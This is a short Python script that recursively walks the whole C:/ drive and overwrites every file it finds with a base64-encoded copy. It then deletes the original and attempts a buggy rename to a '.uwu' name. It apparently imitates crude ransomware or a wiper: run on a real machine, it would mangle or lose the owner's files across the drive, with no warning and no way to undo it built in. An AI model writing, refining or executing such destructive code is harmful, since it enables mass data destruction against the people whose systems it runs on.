import os
import base64
import shutil

def encode_file(file_path):
   try:
       with open(file_path, 'rb') as file:
           encoded_data = base64.b64encode(file.read()).decode('utf-8')

       with open(file_path, 'w') as file:
           file.write(encoded_data)

       shutil.copy(file_path, f"{file}.uwu")
       os.remove(file_path)
       os.rename(f"{file}.uwu", file)
   except Exception as e:
       print(f"Error encoding or renaming file {file_path}: {e}")

def main():
   for root, dirs, files in os.walk('C:/'):
       for file in files:
           file_path = os.path.join(root, file)
           try:
               encode_file(file_path)
           except Exception as e:
               print(f"Error processing file {file_path}: {e}")

if __name__ == "__main__":
   main()
